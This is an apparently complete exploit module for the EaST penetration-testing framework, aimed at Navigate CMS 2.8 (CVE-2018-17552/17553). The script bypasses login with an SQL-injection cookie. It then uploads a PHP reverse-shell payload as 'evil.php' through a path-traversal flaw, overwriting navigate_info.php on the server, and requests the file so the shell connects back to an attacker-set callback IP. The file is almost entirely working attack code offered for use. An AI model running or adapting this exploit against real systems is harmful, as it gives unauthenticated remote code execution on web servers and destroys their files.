from Sploit import Sploit
from collections import OrderedDict
import urllib2
import urllib
import cookielib
from WebHelper import FormPoster
from Shellcodes import CrossOSShellcodes
from ShellUtils import Constants

INFO = {}
INFO['NAME'] = "efa_navigate_cms_8.2_ab_rce"
INFO['DESCRIPTION'] = "Navigate CMS 8.2 Auth Bypass/Remote Code Execution"
INFO['VENDOR'] = "https://www.navigatecms.com/en/home"
INFO['CVE Name'] = "CVE 2018-17552, CVE 2018-17553"
INFO['NOTES'] = """
This module exploits insufficient sanitization in the database::protect
method, of Navigate CMS versions 2.8 and prior, to bypass authentication.
The module then uses a path traversal vulnerability in navigate_upload.php
that allows authenticated users to upload PHP files to arbitrary locations.
Together these vulnerabilities allow an unauthenticated attacker to
execute arbitrary PHP code remotely.
This module was tested against Navigate CMS 2.8.
"""
INFO['DOWNLOAD_LINK'] = "https://sourceforge.net/projects/navigatecms/files/releases/"
INFO['LINKS'] = ["https://www.exploit-db.com/exploits/45561/"]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/Web"
INFO['AUTHOR'] = "Pyriphlegethon # Discovery / msf module\r\n" \
                 "Gleg Team # EaST Framework module"

OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.57"
OPTIONS["PORT"] = 80
OPTIONS["BASEPATH"] = "/navigate"
OPTIONS["CALLBACK_IP"] = '192.168.1.221'
OPTIONS["SSL"] = False


class NoRedirectHandler(urllib2.HTTPRedirectHandler):
    # alternative handler
    def http_error_300(self, req, fp, code, msg, header_list):
        data = urllib.addinfourl(fp, header_list, req.get_full_url())
        data.status = code
        data.code = code

        return data

    # setup aliases
    http_error_301 = http_error_300
    http_error_302 = http_error_300
    http_error_303 = http_error_300
    http_error_307 = http_error_300


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 80
        self.basepath = 'navigate/'
        self.cookies = cookielib.CookieJar()
        self.callback_ip = '127.0.0.1'
        self.protocol = 'http'

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.basepath = self.args.get("BASEPATH", self.basepath)
        self.callback_ip = self.args.get("CALLBACK_IP", self.callback_ip)

        self.protocol = 'https' if self.args.get("SSL") else 'http'

        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log('Please enable listener')
            self.finish(False)

        urllib2.install_opener(
            urllib2.build_opener(
                urllib2.HTTPCookieProcessor(
                    self.cookies
                ),
                NoRedirectHandler()
            )
        )

    def bypass_auth(self):
        url = "{}://{}:{}{}/login.php".format(self.protocol, self.host, self.port, self.basepath)
        r = urllib2.Request(url)
        r.add_header('Cookie', 'navigate-user=\\"%20OR%20TRUE--%20')  # %00 may also work

        try:
            self.log('[*] Trying to bypass authentication...')
            resp = urllib2.urlopen(r)
            if resp.getcode() == 200:
                self.log('[-] Bypass failed. Fixed?')
                self.finish(False)
        except Exception as ex:
            self.log('[-] Bypass request failed\r\n%s' % ex)
            self.finish(False)


    def test(self):
        url = "{}://{}:{}{}/navigate.php?".format(self.protocol, self.host, self.port, self.basepath)
        req = urllib2.Request(url)

        try:
            resp = urllib2.urlopen(req)
        except urllib2.HTTPError, ex:
            # for some reason request to /navigate.php? returns 404,
            # despite the fact that the server also returns main page
            if 'contextmenu-dashboard' in ex.fp.read():
                self.log('[+] Bypass successful')
        except Exception as ex:
            self.log('[-] Test request failed\r\n%s' % ex)

    def create_shellcode(self):
        s = CrossOSShellcodes(self.callback_ip, self.listener_port)
        shellcode = s.create_shellcode(Constants.ShellcodeType.PHP)

        return shellcode

    def upload_shell(self, shellcode):
        f = FormPoster()
        f.add_file('file', 'evil.php', shellcode, False, 'image/jpeg')

        for c in self.cookies:
            if 'NVSID_' in c.name:
                cookie = c.value
                break

        url = '{}://{}:{}{}/navigate_upload.php?session_id={}&engine=picnik&id=../../../navigate_info.php'.format(self.protocol, self.host, self.port, self.basepath, cookie)
        req = f.post(url)
        try:
            # be careful cause this request will overwrite navigate_info.php
            self.log('[*] Uploading shell...')
            res = urllib2.urlopen(req)
            self.log('[+] Success')
        except Exception as ex:
            self.log('[-] Shell upload failed\r\n%s' % ex)
            self.finish(False)

    def trigger_payload(self):
        try:
            self.log('[*] Triggering payload...')
            urllib2.urlopen('{}://{}:{}{}/navigate_info.php'.format(self.protocol, self.host, self.port, self.basepath))
        except Exception as ex:
            self.log('[-] Failed to trigger payload\r\n%s' % ex)
            self.finish(False)

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.bypass_auth()
        self.test()
        self.upload_shell(
            self.create_shellcode()
        )
        self.trigger_payload()

        if self.is_listener_connected():
            self.finish(True)
        else:
            self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
